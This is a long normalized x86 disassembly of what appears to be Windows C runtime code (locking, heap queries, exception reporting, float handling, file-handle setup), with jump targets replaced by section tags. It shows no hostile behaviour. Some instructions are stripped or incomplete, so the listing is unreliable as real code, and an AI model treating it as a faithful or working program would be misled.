mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_40af60
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_40458d
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_401e50
mov ecx eax
cmp ecx eax
jae r-xdata
sub_40afb0
push 0x8
push r--data
call sub_413ff0
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40723f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b052
push 0xc
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_403316
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b05b
call sub_414035
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_40b07c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_413d3c
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_415070
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40b0dc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40b11e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_407c83
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40ef77
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40ef77
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_40b1f0
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_40b20f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40723f
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_40b241
push 0xc
push r--data
call sub_413ff0
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40ffac
push ebx
push esi
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_405707
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_4138f0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_405707
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_4010a8
pop ecx
pop ecx
push eax
push esi
call sub_4138f0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_414035
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_4010a8
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_40b3c0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40ec60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
pop ecx
sub_40b419
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_40b440
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_40af60
sub esi ecx
sar esi 0x2
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x4
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax edi
call sub_40af60
mov ecx [ edi ]
mov edx [ ecx + esi * 4 ]
mov [ eax ] edx
add [ edi + 0x4 ] 0x4
pop esi
retn
sub_40b492
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
or eax 0xffffffff
pop ebp
retn
sub_40b4ce
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_41334d
pop ecx
pop ebp
retn
sub_40b4fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_413e10
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40f156
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40f156
pop ecx
sub_40b635
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_407759
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4057cc
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_40b6dd
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
sub_40b6dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_40bc2e
push 0xc
push r--data
call sub_413ff0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_414035
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bcc4
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40bccd
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40a4e5
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40a4e5
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
